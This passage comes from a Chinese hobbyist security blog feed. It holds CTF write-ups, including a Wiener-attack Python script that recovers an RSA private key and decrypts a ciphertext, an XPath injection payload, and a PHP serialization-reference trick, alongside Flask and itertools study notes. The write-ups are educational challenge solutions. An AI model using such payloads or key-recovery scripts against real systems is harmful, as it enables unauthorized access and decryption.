class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$openssl</span> rsa -pubin -text -modulus -in fuckrsa.pub</span><br><span class="line">......</span><br><span class="line">Modulus:</span><br><span class="line">    <span class="number">03</span>:<span class="number">67</span>:<span class="number">19</span>:<span class="number">8</span>d:<span class="number">6</span>b:<span class="number">56</span>:<span class="number">14</span>:e9:<span class="number">58</span>:<span class="number">13</span>:ad:d8:f2:<span class="number">2</span>a:<span class="number">47</span>:</span><br><span class="line">    <span class="number">17</span>:bc:<span class="number">72</span>:be:<span class="number">1</span>e:ab:d9:<span class="number">33</span>:d1:b8:<span class="number">69</span>:<span class="number">44</span>:fd:b7:<span class="number">5</span>b:</span><br><span class="line">    <span class="number">8</span>e:d2:<span class="number">30</span>:be:<span class="number">62</span>:d7:d1:b6:<span class="number">9</span>d:<span class="number">22</span>:<span class="number">20</span>:<span class="number">95</span>:c1:<span class="number">28</span>:c8:</span><br><span class="line">    <span class="number">6</span>f:<span class="number">82</span>:<span class="number">01</span>:<span class="number">2</span>e:cb:<span class="number">11</span>:<span class="number">61</span>:<span class="number">91</span>:fd:<span class="number">9</span>d:<span class="number">01</span>:<span class="number">8</span>a:<span class="number">6</span>d:<span class="number">02</span>:f8:</span><br><span class="line">    <span class="number">4</span>d:b2:<span class="number">7</span>b:c5:<span class="number">1</span>a:<span class="number">21</span>:<span class="number">30</span>:<span class="number">7</span>d:c8:<span class="number">6</span>f:<span class="number">4</span>b:f7:<span class="number">71</span>:c6:<span class="number">91</span>:</span><br><span class="line">    c1:<span class="number">43</span>:e5:ab:e5:<span class="number">49</span>:b5:bd:<span class="number">2</span>d:<span class="number">6</span>e:b1:a2:<span class="number">1</span>f:d6:<span class="number">27</span>:</span><br><span class="line">    <span class="number">0</span>e:<span class="number">7</span>e:<span class="number">1</span>b:<span class="number">48</span>:fe:<span class="number">06</span>:<span class="number">11</span>:fb:b2:e1:b0:b3:<span class="number">52</span>:<span class="number">4</span>e:<span class="number">6</span>f:</span><br><span class="line">    <span class="number">4</span>d:e8:b4:e4:a3:<span class="number">45</span>:da:<span class="number">44</span>:a1:<span class="number">3</span>d:e8:<span class="number">25</span>:b7:<span class="number">26</span>:<span class="number">08</span>:</span><br><span class="line">    db:<span class="number">6</span>c:<span class="number">7</span>c:<span class="number">4</span>a:<span class="number">40</span>:b7:<span class="number">82</span>:<span class="number">66</span>:e6:c8:<span class="number">7</span>b:bf:de:f6:b4:</span><br><span class="line">    <span class="number">83</span>:<span class="number">81</span>:d4:<span class="number">9</span>c:<span class="number">45</span>:<span class="number">07</span>:a5:<span class="number">8</span>b:<span class="built_in">cd</span>:<span class="number">47</span>:b7:<span class="number">6</span>d:<span class="number">64</span>:b4:<span class="number">59</span>:</span><br><span class="line">    <span class="number">08</span>:b1:<span class="number">58</span>:bd:<span class="number">7</span>e:bc:<span class="number">4</span>d:ac:b0:b1:cf:d6:c2:c1:<span class="number">95</span>:</span><br><span class="line">    <span class="number">74</span>:f4:<span class="number">0</span>e:b2:ef:d0:e9:e1:<span class="number">0</span>d:c7:<span class="number">00</span>:<span class="number">5</span>c:ad:<span class="number">39</span>:bc:</span><br><span class="line">    af:<span class="number">52</span>:b9:ea:c3:<span class="number">87</span>:<span class="number">33</span>:<span class="number">68</span>:d6:<span class="number">90</span>:<span class="number">31</span>:c5:e7:<span class="number">24</span>:<span class="number">68</span>:</span><br><span class="line">    <span class="number">4</span>a:<span class="number">44</span>:f0:<span class="number">68</span>:ef:d1:d3:dc:<span class="number">09</span>:<span class="number">6</span>d:<span class="number">9</span>b:<span class="number">5</span>d:<span class="number">64</span>:<span class="number">11</span>:e5:</span><br><span class="line">    <span class="number">8</span>b:de:e4:<span class="number">3</span>e:<span class="number">46</span>:b9:<span class="number">9</span>a:<span class="number">0</span>d:<span class="number">04</span>:<span class="number">94</span>:b9:db:<span class="number">28</span>:<span class="number">19</span>:<span class="number">5</span>a:</span><br><span class="line">    f9:<span class="number">01</span>:af:f1:<span class="number">30</span>:d4:a6:e2:<span class="number">03</span>:da:d0:<span class="number">8</span>d:a5:<span class="number">7</span>f:a7:</span><br><span class="line">    e4:<span class="number">02</span>:<span class="number">62</span>:a5:ba:db:<span class="number">2</span>a:<span class="number">32</span>:<span class="number">3</span>e:da:<span class="number">28</span>:b4:<span class="number">46</span>:<span class="number">96</span>:ab:</span><br><span class="line">    <span class="number">30</span>:<span class="number">5</span>d</span><br><span class="line">Exponent:</span><br><span class="line">    <span class="number">00</span>:f3:<span class="number">95</span>:<span class="number">9</span>d:<span class="number">97</span>:<span class="number">8</span>e:<span class="number">02</span>:eb:<span class="number">9</span>f:<span class="number">06</span>:de:f3:f3:<span class="number">35</span>:d8:</span><br><span class="line">    f8:af:d7:<span class="number">60</span>:<span class="number">99</span>:<span class="number">51</span>:dd:ac:<span class="number">60</span>:b7:<span class="number">14</span>:b6:c2:<span class="number">2</span>a:f0:</span><br><span class="line">    fa:<span class="number">91</span>:<span class="number">2</span>f:<span class="number">21</span>:<span class="number">0</span>b:<span class="number">34</span>:<span class="number">20</span>:<span class="number">6</span>b:d2:<span class="number">4</span>a:<span class="number">96</span>:<span class="number">01</span>:c7:<span class="number">8</span>d:f4:</span><br><span class="line">    a0:<span class="number">27</span>:<span class="number">5</span>f:<span class="number">10</span>:<span class="number">7</span>f:d3:ab:<span class="number">55</span>:<span class="number">2</span>d:<span class="number">95</span>:<span class="number">05</span>:<span class="number">7</span>e:b9:<span class="number">34</span>:e7:</span><br><span class="line">    <span class="number">1</span>b:dd:<span class="built_in">cd</span>:<span class="number">70</span>:<span class="number">45</span>:c2:<span class="number">4</span>b:<span class="number">18</span>:<span class="number">58</span>:<span class="number">7</span>b:<span class="number">8</span>c:<span class="number">8</span>f:cf:<span class="number">5</span>a:dd:</span><br><span class="line">    <span class="number">4</span>c:<span class="number">5</span>d:<span class="number">83</span>:f0:c7:<span class="number">7</span>c:<span class="number">94</span>:dc:<span class="number">9</span>c:<span class="number">50</span>:cb:e4:<span class="number">38</span>:e2:b6:</span><br><span class="line">    <span class="number">7</span>b:af:d3:<span class="number">16</span>:<span class="number">33</span>:b6:aa:f1:<span class="number">78</span>:<span class="number">1</span>d:<span class="number">90</span>:c3:ad:<span class="number">6</span>f:<span class="number">03</span>:</span><br><span class="line">    d0:<span class="number">37</span>:b3:<span class="number">32</span>:<span class="number">18</span>:<span class="number">01</span>:b2:<span class="number">35</span>:<span class="number">46</span>:d4:<span class="number">83</span>:e6:<span class="number">7</span>e:<span class="number">26</span>:<span class="number">06</span>:</span><br><span class="line">    <span class="number">7</span>f:<span class="number">7</span>b:<span class="number">22</span>:<span class="number">34</span>:<span class="number">7</span>d:db:c0:c2:d5:<span class="number">92</span>:ce:<span class="number">81</span>:<span class="number">4</span>c:bf:<span class="number">5</span>d:</span><br><span class="line">    <span class="built_in">fc</span>:cc:<span class="number">14</span>:<span class="number">14</span>:<span class="number">37</span>:f1:<span class="number">4</span>e:<span class="number">0</span>b:<span class="number">39</span>:<span class="number">90</span>:f8:<span class="number">80</span>:<span class="number">61</span>:e5:f0:</span><br><span class="line">    ba:e5:f0:<span class="number">1</span>e:<span class="number">3</span>f:a7:<span class="number">0</span>d:b0:e9:<span class="number">60</span>:<span class="number">5</span>e:<span class="number">7</span>c:fd:<span class="number">57</span>:<span class="number">5</span>e:</span><br><span class="line">    <span class="number">9</span>c:<span class="number">81</span>:ef:ee:c5:<span class="number">29</span>:c3:<span class="number">3</span>f:d9:<span class="number">03</span>:<span class="number">7</span>a:<span class="number">20</span>:fd:<span class="number">8</span>a:<span class="built_in">cd</span>:</span><br><span class="line">    <span class="number">51</span>:<span class="number">3</span>a:c9:<span class="number">63</span>:<span class="number">77</span>:<span class="number">68</span>:<span class="number">31</span>:<span class="number">3</span>e:<span class="number">63</span>:f9:<span class="number">83</span>:<span class="number">8</span>a:e3:<span class="number">51</span>:<span class="number">1</span>c:</span><br><span class="line">    dd:<span class="number">0</span>a:<span class="number">9</span>a:<span class="number">2</span>b:<span class="number">51</span>:<span class="number">6</span>f:<span class="number">21</span>:<span class="number">48</span>:c8:d4:<span class="number">75</span>:a3:<span class="number">60</span>:a0:<span class="number">63</span>:</span><br><span class="line">    <span class="number">59</span>:<span class="number">44</span>:<span class="number">97</span>:<span class="number">39</span>:ee:<span class="built_in">cd</span>:<span class="number">25</span>:<span class="number">1</span>a:bb:<span class="number">42</span>:b0:<span class="number">14</span>:<span class="number">57</span>:<span class="number">3</span>e:<span class="number">43</span>:</span><br><span class="line">    <span class="number">9</span>f:<span class="number">2</span>f:a4:<span class="number">57</span>:<span class="number">35</span>:<span class="number">57</span>:b2:<span class="number">56</span>:<span class="number">99</span>:ff:c1:<span class="number">1</span>e:<span class="number">63</span>:<span class="number">1</span>c:e8:</span><br><span class="line">    ee:<span class="number">97</span>:<span class="number">5</span>a:<span class="number">86</span>:e7:e2:<span class="number">72</span>:bc:f5:f7:<span class="number">6</span>a:<span class="number">93</span>:<span class="number">45</span>:<span class="number">03</span>:<span class="number">48</span>:</span><br><span class="line">    fe:<span class="number">3</span>f</span><br><span class="line">......</span><br></pre></td></tr></table></figure></p>
<p>然后有一个RSA大值的攻击脚本，当m和e为大指数时，可以通过这个脚本解得私钥，脚本下载地址：<a href="https://github.com/pablocelayes/rsa-wiener-attack" target="_blank" rel="external">https://github.com/pablocelayes/rsa-wiener-attack</a></p>
<p>然后，，，这个脚本不会用，根据另一个大神的writeup，得到下面的脚本<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ContinuedFractions, Arithmetic</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">sys.setrecursionlimit(<span class="number">1000000</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hack_RSA</span><span class="params">(e,n)</span>:</span></span><br><span class="line">    <span class="string">'''</span><br><span class="line">    Finds d knowing (e,n)</span><br><span class="line">    applying the Wiener continued fraction attack</span><br><span class="line">    '''</span></span><br><span class="line">    frac = ContinuedFractions.rational_to_contfrac(e, n)</span><br><span class="line">    convergents = ContinuedFractions.convergents_from_contfrac(frac)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (k,d) <span class="keyword">in</span> convergents:</span><br><span class="line">        </span><br><span class="line">        <span class="comment">#check if d is actually the key</span></span><br><span class="line">        <span class="keyword">if</span> k!=<span class="number">0</span> <span class="keyword">and</span> (e*d-<span class="number">1</span>)%k == <span class="number">0</span>:</span><br><span class="line">            phi = (e*d-<span class="number">1</span>)//k</span><br><span class="line">            s = n - phi + <span class="number">1</span></span><br><span class="line">            <span class="comment"># check if the equation x^2 - s*x + n = 0</span></span><br><span class="line">            <span class="comment"># has integer roots</span></span><br><span class="line">            discr = s*s - <span class="number">4</span>*n</span><br><span class="line">            <span class="keyword">if</span>(discr&gt;=<span class="number">0</span>):</span><br><span class="line">                t = Arithmetic.is_perfect_square(discr)</span><br><span class="line">                <span class="keyword">if</span> t!=-<span class="number">1</span> <span class="keyword">and</span> (s+t)%<span class="number">2</span>==<span class="number">0</span>:</span><br><span class="line">                    print(<span class="string">"Hacked!"</span>)</span><br><span class="line">                    <span class="keyword">return</span> d</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">     e = <span class="number">0xF3959D978E02EB9F06DEF3F335D8F8AFD7609951DDAC60B714B6C22AF0FA912F210B34206BD24A9601C78DF4A0275F107FD3AB552D95057EB934E71BDDCD7045C24B18587B8C8FCF5ADD4C5D83F0C77C94DC9C50CBE438E2B67BAFD31633B6AAF1781D90C3AD6F03D037B3321801B23546D483E67E26067F7B22347DDBC0C2D592CE814CBF5DFCCC141437F14E0B3990F88061E5F0BAE5F01E3FA70DB0E9605E7CFD575E9C81EFEEC529C33FD9037A20FD8ACD513AC9637768313E63F9838AE3511CDD0A9A2B516F2148C8D475A360A06359449739EECD251ABB42B014573E439F2FA4573557B25699FFC11E631CE8EE975A86E7E272BCF5F76A93450348FE3F</span></span><br><span class="line">     n = <span class="number">0x367198D6B5614E95813ADD8F22A4717BC72BE1EABD933D1B86944FDB75B8ED230BE62D7D1B69D222095C128C86F82012ECB116191FD9D018A6D02F84DB27BC51A21307DC86F4BF771C691C143E5ABE549B5BD2D6EB1A21FD6270E7E1B48FE0611FBB2E1B0B3524E6F4DE8B4E4A345DA44A13DE825B72608DB6C7C4A40B78266E6C87BBFDEF6B48381D49C4507A58BCD47B76D64B45908B158BD7EBC4DACB0B1CFD6C2C19574F40EB2EFD0E9E10DC7005CAD39BCAF52B9EAC3873368D69031C5E724684A44F068EFD1D3DC096D9B5D6411E58BDEE43E46B99A0D0494B9DB28195AF901AFF130D4A6E203DAD08DA57FA7E40262A5BADB2A323EDA28B44696AB305D</span></span><br><span class="line">     d = hack_RSA(e,n)</span><br><span class="line">     <span class="keyword">print</span> d</span><br><span class="line"><span class="comment">#e就是上面的Exponent，n为Modulus，输出的d为私钥</span></span><br><span class="line"><span class="comment">#d = 4221909016509078129201801236879446760697885220928506696150646938237440992746683409881141451831939190609743447676525325543963362353923989076199470515758399</span></span><br></pre></td></tr></table></figure></p>
<p>得到了私钥，就可以解出密文了，用下面的脚本：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">n = <span class="number">0x367198D6B5614E95813ADD8F22A4717BC72BE1EABD933D1B86944FDB75B8ED230BE62D7D1B69D222095C128C86F82012ECB116191FD9D018A6D02F84DB27BC51A21307DC86F4BF771C691C143E5ABE549B5BD2D6EB1A21FD6270E7E1B48FE0611FBB2E1B0B3524E6F4DE8B4E4A345DA44A13DE825B72608DB6C7C4A40B78266E6C87BBFDEF6B48381D49C4507A58BCD47B76D64B45908B158BD7EBC4DACB0B1CFD6C2C19574F40EB2EFD0E9E10DC7005CAD39BCAF52B9EAC3873368D69031C5E724684A44F068EFD1D3DC096D9B5D6411E58BDEE43E46B99A0D0494B9DB28195AF901AFF130D4A6E203DAD08DA57FA7E40262A5BADB2A323EDA28B44696AB305D</span></span><br><span class="line">d = <span class="number">4221909016509078129201801236879446760697885220928506696150646938237440992746683409881141451831939190609743447676525325543963362353923989076199470515758399L</span></span><br><span class="line">c = <span class="number">0x1e04304936215de8e21965cfca9c245b1a8f38339875d36779c0f123c475bc24d5eef50e7d9ff5830e80c62e8083ec55f27456c80b0ab26546b9aeb8af30e82b650690a2ed7ea407dcd094ab9c9d3d25a93b2140dcebae1814610302896e67f3ae37d108cd029fae6362ea7ac1168974c1a747ec9173799e1107e7a56d783660418ebdf6898d7037cea25867093216c2c702ef3eef71f694a6063f5f0f1179c8a2afe9898ae8dec5bb393cdffa3a52a297cd96d1ea602309ecf47cd009829b44ed3100cf6194510c53c25ca7435f60ce5f4f614cdd2c63756093b848a70aade002d6bc8f316c9e5503f32d39a56193d1d92b697b48f5aa43417631846824b5e86</span></span><br><span class="line"></span><br><span class="line">m = hex(pow(c, d, n)).rstrip(<span class="string">"L"</span>)</span><br><span class="line"><span class="keyword">print</span> m</span><br><span class="line"><span class="keyword">print</span> binascii.unhexlify(m[<span class="number">2</span>:])</span><br></pre></td></tr></table></figure></p>
<p>输出得到的，就是个BCTF一模一样，，，</p>
<p>//没学过密码学，，，这题对我来说就是看个热闹，，只会操作，不懂原理。。。</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>不会加密，全靠看别人的flag<br>]]>
    
    </summary>
    
      <category term="CTF" scheme="http://lazysheep.cc/tags/CTF/"/>
    
      <category term="H-blog" scheme="http://lazysheep.cc/categories/H-blog/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Python之Flask(一)]]></title>
    <link href="http://lazysheep.cc/2015/04/20/0x22/"/>
    <id>http://lazysheep.cc/2015/04/20/0x22/</id>
    <published>2015-04-20T13:42:59.000Z</published>
    <updated>2015-04-20T14:12:43.000Z</updated>
    <content type="html"><![CDATA[<p><strong>Flask入门学习笔记</strong><br><a id="more"></a></p>
<h3 id="Small_application">Small application</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">####           heh.py</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="decorator">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">return</span> <span class="string">'Helloworld!'</span></span><br><span class="line"></span><br><span class="line"><span class="decorator">@app.route('/he.php')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">he</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">return</span> <span class="string">'I\'m python!'</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">	app.run(debug=<span class="keyword">True</span>,host=<span class="string">'0.0.0.0'</span>)</span><br></pre></td></tr></table></figure>
<p>然后在终端执行下面命令：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ python heh.py </span><br><span class="line"> * Running on http://<span class="number">0.0</span>.<span class="number">0.0</span>:<span class="number">5000</span>/ (Press CTRL+C to quit)</span><br><span class="line"> * Restarting with <span class="built_in">stat</span></span><br></pre></td></tr></table></figure></p>
<p>(PS：别用CTRL+Z停止，不对，应该是这个无法停止脚本，只有关闭终端和CTRL+C才能停止脚本～～)<br>在浏览器上输入链接 <code>http://127.0.0.1:5000</code> 浏览器上就会出现 <code>Helloworld!</code><br>在浏览器上输入链接 <code>http://127.0.0.1:5000/he.php</code> 浏览器上就会出现 <code>I&#39;m python!</code><br>================可爱的==分割线=================</p>
<p>笔记：<br><code>@app.route(&#39;/&#39;)</code> 访问<code>http://127.0.0.1:5000</code><br><code>@app.route(&#39;/heheda/&#39;)</code> 访问 <code>http://127.0.0.1:5000/heheda/</code></p>
<p>//设，主机外网IP为：6.6.6.6</p>
<p><code>app.run(debug=True,host=&#39;0.0.0.0&#39;)</code> 访问 <code>http://127.0.0.1:5000</code> 和 <code>http://6.6.6.6:5000</code> 皆可访问项目，修改文件后，刷新页面就可看到变化<br><code>app.run(debug=True)</code> 只能通过 <code>http://127.0.0.1:5000</code>访问<br><code>app.run()</code> 修改文件后，需要’CTRL+C’停止应用后，在运行，页面才会有变化</p>
]]></content>
    <summary type="html">
    <![CDATA[<p><strong>Flask入门学习笔记</strong><br>]]>
    
    </summary>
    
      <category term="Python" scheme="http://lazysheep.cc/tags/Python/"/>
    
      <category term="H-blog" scheme="http://lazysheep.cc/categories/H-blog/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[new hctf writeup - 0]]></title>
    <link href="http://lazysheep.cc/2015/04/15/0x20/"/>
    <id>http://lazysheep.cc/2015/04/15/0x20/</id>
    <published>2015-04-15T04:22:38.000Z</published>
    <updated>2015-04-18T13:32:04.000Z</updated>
    <content type="html"><![CDATA[<p><strong>平台更新了，出了几题新题，哎～～没学过汇编，最简单的PWN都不会…只会WEB,,哎，，沦为WEB狗了</strong><br><a id="more"></a></p>
<p><em>哎，一个一血也没有，。。。。</em></p>
<h2 id="0x0_Firest-Step_|_POINT_:_10">0x0 Firest-Step | POINT : 10</h2><blockquote>
<p>题目描述 : 新平台的第一题，但愿不要出现什么bug。有bug及时报告啊~作为奖励，赏你们个flag。upgs{J31pbz3-g0-uqh1fn-p7s}</p>
</blockquote>
<p>今年BCTF的第一题，就如HINT写的那样，不需要什么hint，很简单的。起的迟，一血被AK拿了～_～/</p>
<h2 id="0x1_另类的注入_|_POINT_:_100">0x1 另类的注入 | POINT : 100</h2><blockquote>
<p>题目描述 : 上次各种SQL注入你们是不是都疯了，我们换一个注入玩玩。</p>
</blockquote>
<p>这题是XPATH injection。。。没学过XPATH，然后就百度，学学呗，然后盲注出 admin 的 password ，然后并没有什么用。。。</p>
<p>最后回过头来看最开始给的那个XPATH注入的博文 : <a href="http://blog.csdn.net/yefan2222/article/details/7227932" target="_blank" rel="external">http://blog.csdn.net/yefan2222/article/details/7227932</a></p>
<p>参考这篇博文中的payload，构造出以下payload : </p>
<blockquote>
<ul>
<li>lightless’] | //*| //*[‘</li>
</ul>
</blockquote>
<p>Get Flag !</p>
<h2 id="0x2_PHPの黑魔法？！|_POINT_:_300">0x2 PHPの黑魔法？！| POINT : 300</h2><blockquote>
<p>题目描述 : 这个题我也不会做，做出来的老司机教教我！ </p>
</blockquote>
<p>写了这么久的PHP，做完这题后，我才知道，PHP竟然有指针！（世界上最好的语言需要指针？）。</p>
<p>这题是出自 ‘php4fun challenge 6’</p>
<p>解法一 : 把上面引号里的拿去Google,可以找到正解。<br>PS：WooYun里这题的解法是错误的，而百度上能找到的基本都是来源于WooYun….反正我是没能百度到</p>
<p>解法二 : 参考WooYun错误的解法，做了一个修改</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//WooYun错误解法</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">just4fun</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$enter</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$secret</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> just4fun();</span><br><span class="line"><span class="variable">$a</span>-&gt;enter=<span class="string">'?????????????????????????????'</span>;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$a</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">//修改后，我的解法</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">lightless</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$enter</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$secret</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> lightless();</span><br><span class="line"><span class="variable">$a</span>-&gt;secret = <span class="string">'a'</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;enter= &amp;<span class="variable">$a</span>-&gt;secret;   <span class="comment">//真是第一次知道PHP竟然有指针</span></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>
<p>参考文献 -&gt; 自行Google -&gt; ‘php serialize 格式详解’</p>
<p>Get Flag !</p>
]]></content>
    <summary type="html">
    <![CDATA[<p><strong>平台更新了，出了几题新题，哎～～没学过汇编，最简单的PWN都不会…只会WEB,,哎，，沦为WEB狗了</strong><br>]]>
    
    </summary>
    
      <category term="CTF" scheme="http://lazysheep.cc/tags/CTF/"/>
    
      <category term="PHP" scheme="http://lazysheep.cc/tags/PHP/"/>
    
      <category term="Xpath injection" scheme="http://lazysheep.cc/tags/Xpath-injection/"/>
    
      <category term="代码审计" scheme="http://lazysheep.cc/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="H-blog" scheme="http://lazysheep.cc/categories/H-blog/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[python 查课表]]></title>
    <link href="http://lazysheep.cc/2015/04/05/0x1F/"/>
    <id>http://lazysheep.cc/2015/04/05/0x1F/</id>
    <published>2015-04-05T03:03:23.000Z</published>
    <updated>2015-04-05T03:14:06.000Z</updated>
    <content type="html"><![CDATA[<p><strong>折腾了一天，，终于完成了，，，</strong><br><a id="more"></a></p>
<p>用python写的爬数字杭电。抓课表。。。</p>
<p>学到了很多。。。比如坑爹的正则。。。熟练了下多线程模块…..(用多线程其实不是很必要，我只是为了装13～～～)</p>
<p>数字杭电真恶心。。。跳来跳去。。。烦死了。。。要查课表。。。必须要有三个域名下的cookie。。。所以好麻烦。。。</p>
<p>最后。。代码开源吧。。。</p>
<p><a href="https://github.com/Hcamael/kebiao" target="_blank" rel="external">github</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<p><strong>折腾了一天，，终于完成了，，，</strong><br>]]>
    
    </summary>
    
      <category term="Python" scheme="http://lazysheep.cc/tags/Python/"/>
    
      <category term="H-blog" scheme="http://lazysheep.cc/categories/H-blog/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[python之itertools模块]]></title>
    <link href="http://lazysheep.cc/2015/04/02/0x1E/"/>
    <id>http://lazysheep.cc/2015/04/02/0x1E/</id>
    <published>2015-04-02T08:31:13.000Z</published>
    <updated>2015-04-03T05:21:34.000Z</updated>
    <content type="html"><![CDATA[<p><strong>分析了一下itertools模块</strong></p>
<a id="more"></a>
<h2 id="0x0_Infinite_Iterators_//无限迭代器">0x0 Infinite Iterators //无限迭代器</h2><h4 id="0x00">0x00</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">count</span><span class="params">(start=<span class="number">0</span>, step=<span class="number">1</span>)</span>:</span></span><br><span class="line">    <span class="comment"># count(10) --&gt; 10 11 12 13 14 ...</span></span><br><span class="line">    <span class="comment"># count(2.5, 0.5) -&gt; 2.5 3.0 3.5 ...</span></span><br><span class="line">    n = start</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        <span class="keyword">yield</span> n</span><br><span class="line">        n += step</span><br><span class="line">//接受两个参数，第一个是开始的数，第二个是步数。从start开始无限循环</span><br></pre></td></tr></table></figure>
<h4 id="0x01">0x01</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cycle</span><span class="params">(iterable)</span>:</span></span><br><span class="line">    <span class="comment"># cycle('ABCD') --&gt; A B C D A B C D A B C D ...</span></span><br><span class="line">    saved = []</span><br><span class="line">    <span class="keyword">for</span> element <span class="keyword">in</span> iterable:</span><br><span class="line">        <span class="keyword">yield</span> element</span><br><span class="line">        saved.append(element)</span><br><span class="line">    <span class="keyword">while</span> saved:</span><br><span class="line">        <span class="keyword">for</span> element <span class="keyword">in</span> saved:</span><br><span class="line">              <span class="keyword">yield</span> element</span><br><span class="line">//给定的数开始进行无限循环</span><br></pre></td></tr></table></figure>
<h4 id="0x02">0x02</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">repeat</span><span class="params">(object, times=None)</span>:</span></span><br><span class="line">    <span class="comment"># repeat(10, 3) --&gt; 10 10 10</span></span><br><span class="line">    <span class="keyword">if</span> times <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">            <span class="keyword">yield</span> object</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(times):</span><br><span class="line">            <span class="keyword">yield</span> object</span><br><span class="line">//第一个参数(object)循环第二个参数(times)次</span><br></pre></td></tr></table></figure>
